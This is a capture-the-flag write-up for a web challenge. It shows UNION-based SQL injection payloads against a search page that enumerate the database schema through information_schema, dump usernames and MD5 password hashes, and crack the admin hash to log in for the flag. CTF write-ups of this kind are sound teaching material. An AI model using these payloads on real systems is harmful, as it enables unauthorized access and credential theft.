Challenge description:
==
There's a lucky draw at http://web.spro.ink:3007 and the top prize for winning it is a world tour for 2 to anywhere! Too bad I have only two valid coupons :(

---
At the website, there is a login page and a search user page.

After trying common sql on the login page with no interesting response, we move on to __search user page__ which had already loaded 2 columns of Username, Nickname for everyone to see.

---
First observation @ http://web.spro.ink:3008/search.php

Results:
|Username|	Nickname|
|---|---|
|admin	|	superuser|
|xinan	|	the guy|
|wenyan	|	the girl|
|potato	|	the food|
|sadhi	|	the friend|
|john	|	the stranger|
	
---
Test for SQL vulnerability
==
We try to see if there are any response when given an invalid data like a single quote. 

Results
>	You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''''' at line 1

When we see the error message, we can conclude that this input form is vulnerable to sql injection.

---
Constructing injection
==
From our very 1st observation, the 2 preloaded columns of Username and Nickname implied that a SELECT statement is inside.

My initial guess:	
```SQL
SELECT Username, Nickname from XXXX where Username='<input name here>'
```

We can make use of the ```UNION``` command to add another ```SELECT``` statements with same number of columns behind the guess.

There is also an interesting table known as ```information_schema``` in MySQL that can help provide us the Table name and its columns!

We proceed to inject the follow:
```sql
' UNION SELECT table_name, column_name FROM information_schema.columns WHERE     '1'='1
```
    
Explanation:
- The first single quote terminate the string to be read by acting as a closing quote. Notice that the very last digit 1
do not have a closing quote? That's because we are making use of the closing quote within the hidden SQL command.

- ```UNION``` is used to exploit the fact we are aware of the hiden ```SELECT``` using 2 columns so we can combine with our own ```SELECT``` statement with 2 other interesting columns.

- where ```'1'='1'``` will always validate true so it will spew out all the table names and column names.

Results:

|Username	    |	Nickname|
|---|---|
|CHARACTER_SETS	|	CHARACTER_SET_NAME|
|CHARACTER_SETS	|	DEFAULT_COLLATE_NAME|
|CHARACTER_SETS	|	DESCRIPTION|
|CHARACTER_SETS	|	MAXLEN|
|COLLATIONS	    |	COLLATION_NAME|
|COLLATIONS	    |	CHARACTER_SET_NAME|
|COLLATIONS	    |	ID|
|COLLATIONS	    |	IS_DEFAULT|
|COLLATIONS	    |	IS_COMPILED|
|COLLATIONS	    |	SORTLEN|
|...|...|
|...|...|
|...|...|
|users|	        	id|
|users|	        	username|
|users|	        	password|
|users|	        	nickname|

---
Fine tuning
==
After knowing the Table name and column names, we can generate another SQL injection to get the credentials of admin
```sql
' UNION SELECT username, password FROM users WHERE '1'='1
``` 
Result:

|Username|	Nickname|
|---|---|
|admin|		79fff4b82b55a67cf96aa059dc1aa956|
|xinan|		7d493220036eb672a9e2d949920be704|
|wenyan|		7d493220036eb672a9e2d949920be704|
|potato|		7d493220036eb672a9e2d949920be704|
|sadhi|		7d493220036eb672a9e2d949920be704|
|john|		7d493220036eb672a9e2d949920be704|

---
Crack hash
==
We can crack the hash password @ https://crackstation.net/

The md5 hash password: ```clearwat```

Go login as admin with the password and we got the flag! :D 

---
flag{sql1_n3v3r_been_s0_eZ}
